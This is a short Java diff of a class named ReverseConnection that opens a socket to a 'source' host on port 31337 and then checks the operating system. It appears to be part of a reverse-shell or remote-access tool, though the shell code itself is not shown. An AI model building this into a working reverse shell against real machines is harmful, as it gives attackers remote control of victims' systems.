@@ -18,14 +18,9 @@ public class ReverseConnection implements Runnable {
 
 	public void run() {
 		// start the reverse connection
-		System.out.println("Started the reverse connection thread");
+		System.out.println("Started a reverse connection to: " + source.toString());
 		try {
 			Socket s = new Socket(source, 31337);
-			
-			PrintWriter out = new PrintWriter(new OutputStreamWriter(s.getOutputStream()));
-			
-			out.println("This is my test message from the server");
-			out.flush();
 
 			String os = System.getProperty("os.name").toLowerCase();
 
